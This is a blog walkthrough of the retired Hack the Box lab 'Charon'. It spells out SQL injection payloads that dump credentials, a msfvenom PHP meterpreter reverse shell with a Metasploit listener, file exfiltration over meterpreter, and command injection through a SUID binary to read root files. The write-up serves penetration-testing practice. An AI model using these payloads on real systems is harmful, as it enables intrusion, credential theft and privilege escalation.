@@ -1,0 +1,489 @@
+
+								
+																		Hack the Box Challenge: Charon Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on July 13, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “Charon” which is available online for those who want to increase their skill in penetration testing and black box testing. Charon is retired vulnerable lab presented by Hack the Box for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges from beginners to Expert level.
+Level: Expert
+Task: find user.txt and root.txt file on victim’s machine.
+Since these labs are online available therefore they have static IP and IP of sense is 10.10.10.31 so let’s begin with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -sV 10.10.10.31
+			
+				
+					
+				
+					1
+				
+						nmap -sV 10.10.10.31
+					
+				
+			
+		
+
+
+From given below image, you can observe we found port 22 and 80 are open on target system.
+As port 80 is running http server we open the target machine’s ip address in our browser.
+
+We run dirbuster on port 80, which reveals a directory entitled “cmsdata/”.
+
+We open the link, and are presented with a login page.
+
+We don’t find anything on the login page, so we go to forgot password link.
+
+We capture the request of the page using burpsuite, and send it to repeater.
+
+After sending the request to repeater, we try to enumerate if the site is vulnerable to SQL-injection. As soon as we add a quote at the end of our email id we get a database error.
+
+Now to confirm that the site is vulnerable to SQL-injection we use “– – “to comment the query and remove the error.
+
+Now as we know the site is vulnerable to SQL injection, we try to exploit it. First we find the number of columns, to check the number of columns we use “ORDER BY” command to find the number of columns in the table. After find the number of columns we use “UNION SELECT” command to give the output column names with the respective numbers. As UNION and union is blacklisted, we use UNion for SQL-injection.
+‘UNion SELECT 1,2,3,4 — –
+
+We couldn’t run any commands in columns, but when we pass a string in column 4, we successfully ran our query.
+
+Now we know how bypass the security using string, we first find the name of the database
+
+		
+		
+			
+			
+			
+			
+' UNion select 1,2,3,concat(database(), "@who.ami") -- -
+			
+				
+					
+				
+					1
+				
+						' UNion select 1,2,3,concat(database(), "@who.ami") -- -
+					
+				
+			
+		
+
+
+After finding the name of the database we find the table name in the database.
+
+		
+		
+			
+			
+			
+			
+' UNion select 1,2,3,concat(table_name, "@who.ami") FROM information_schema.tables where table_schema="supercms" limit 1,1 -- -
+			
+				
+					
+				
+					1
+				
+						' UNion select 1,2,3,concat(table_name, "@who.ami") FROM information_schema.tables where table_schema="supercms" limit 1,1 -- -
+					
+				
+			
+		
+
+
+Enumerating the tables in the database; we find two tables, one called license and another one called operators.
+
+		
+		
+			
+			
+			
+			
+' UNion select 1,2,3,concat(table_name, "@who.ami") FROM information_schema.tables where table_schema="supercms" limit 2,1 -- -
+			
+				
+					
+				
+					1
+				
+						' UNion select 1,2,3,concat(table_name, "@who.ami") FROM information_schema.tables where table_schema="supercms" limit 2,1 -- -
+					
+				
+			
+		
+
+
+After getting the names of the tables, we enumerate the columns. The license table doesn’t have any interesting columns but in the “operators” table we find a column called “__username_”.
+
+		
+		
+			
+			
+			
+			
+' UNion select 1,2,3,concat(column_name, "@who.ami") FROM information_schema.columns where table_name="operators" limit 1,1 -- -
+			
+				
+					
+				
+					1
+				
+						' UNion select 1,2,3,concat(column_name, "@who.ami") FROM information_schema.columns where table_name="operators" limit 1,1 -- -
+					
+				
+			
+		
+
+
+After getting the “__username_” column we enumerate further and get a column called “__password_”.
+
+		
+		
+			
+			
+			
+			
+' UNion select 1,2,3,concat(column_name, "@who.ami") FROM information_schema.columns where table_name="operators" limit 2,1 -- -
+			
+				
+					
+				
+					1
+				
+						' UNion select 1,2,3,concat(column_name, "@who.ami") FROM information_schema.columns where table_name="operators" limit 2,1 -- -
+					
+				
+			
+		
+
+
+Now we dump the column name “__username_”.
+
+		
+		
+			
+			
+			
+			
+' UNion select 1,2,3,concat(__username_, "@who.ami") FROM operators limit 1,1 -- -
+			
+				
+					
+				
+					1
+				
+						' UNion select 1,2,3,concat(__username_, "@who.ami") FROM operators limit 1,1 -- -
+					
+				
+			
+		
+
+
+Now we dump the column name “__password_” for the username = “super_cms_adm”.
+
+		
+		
+			
+			
+			
+			
+' UNion select 1,2,3,concat(__password_, “@who.ami”) FROM operators limit 1,1 -- -
+			
+				
+					
+				
+					1
+				
+						' UNion select 1,2,3,concat(__password_, “@who.ami”) FROM operators limit 1,1 -- -
+					
+				
+			
+		
+
+
+When we dump the “__password_” column we get a hash. We use hashkiller.co.uk to crack the password.
+
+Now we got the credentials for the supercms login page, supercms:tamarro.
+
+Now login using the above credentials, we were able to get a page where there is an option for uploading image.
+
+Now we open the link and find an upload page.
+
+We take a look at the source page and find a base64 encoded string.
+
+When we decode it we find a string called “testfile1”. It is possible that there is hidden field with this name.
+
+Now we create a php payload using msfvenom, so that we can upload our php shell.
+
+		
+		
+			
+			
+			
+			
+msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.7 lport=4444 -f raw
+			
+				
+					
+				
+					1
+				
+						msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.7 lport=4444 -f raw
+					
+				
+			
+		
+
+
+We capture the upload request and create a new field and add “file.php”.
+
+Now we get the link the location of the file we just uploaded in /images/.
+
+Before running our shell, we setup our listener using metasploit.
+
+		
+		
+			
+			
+			
+			
+msf &gt; use exploit/multi/handler
+msf exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp
+msf exploit(multi/handler) &gt; set lhost 10.10.14.7
+msf exploit(multi/handler) &gt; set lport 4444
+msf exploit(multi/handler) &gt; run
+			
+				
+					
+				
+					12345
+				
+						msf &gt; use exploit/multi/handlermsf exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcpmsf exploit(multi/handler) &gt; set lhost 10.10.14.7msf exploit(multi/handler) &gt; set lport 4444msf exploit(multi/handler) &gt; run
+					
+				
+			
+		
+
+ 
+As soon as we open the link to our shell, we get our reverse shell.
+meterpreter &gt; sysinfo
+
+Now enumerating through the system we find an encrytpted file and a public key inside /home/decoder directory.
+
+We download both the files into our system.
+
+		
+		
+			
+			
+			
+			
+meterpreter &gt; download decoder.pub /root/Desktop
+meterpreter &gt; download pass.crypt /root/Desktop
+			
+				
+					
+				
+					12
+				
+						meterpreter &gt; download decoder.pub /root/Desktopmeterpreter &gt; download pass.crypt /root/Desktop
+					
+				
+			
+		
+
+
+Now we decode the encrypted file using public key with the RsaCtfTool.
+
+		
+		
+			
+			
+			
+			
+./RsaCtfTool.py --publickey /root/Desktop/decoder.pub –uncipherfile /root/Desktop/pass.crypt
+			
+				
+					
+				
+					1
+				
+						./RsaCtfTool.py --publickey /root/Desktop/decoder.pub –uncipherfile /root/Desktop/pass.crypt
+					
+				
+			
+		
+
+
+We use ssh to login using the credentials, decoder:nevermindthebollocks.
+
+		
+		
+			
+			
+			
+			
+ssh decoder@10.10.10.31
+			
+				
+					
+				
+					1
+				
+						ssh decoder@10.10.10.31
+					
+				
+			
+		
+
+
+After logging in we find a file called user.txt, we open the file and find our first flag.
+
+Now we find the files with SUID bit set and find a file called supershell in /usr/local/bin/ directory.
+
+		
+		
+			
+			
+			
+			
+find / -perm -4000 2&gt;/dev/null
+			
+				
+					
+				
+					1
+				
+						find / -perm -4000 2&gt;/dev/null
+					
+				
+			
+		
+
+
+When we run the binary we find that we can run any shell command using this binary. We use this to open root.txt inside /root/ directory. When we open root.txt we find our final flag.
+
+		
+		
+			
+			
+			
+			
+supershell "/bin/ls$
+&gt; cat /root/root.txt"
+			
+				
+					
+				
+					12
+				
+						supershell "/bin/ls$&gt; cat /root/root.txt"
+					
+				
+			
+		
+
+
+Author: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								felipe July 18, 2018 at 3:45 pm							
+							
+							
+														
+							
+								can help my, i have a question, what dictionary you used in dirbuster
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
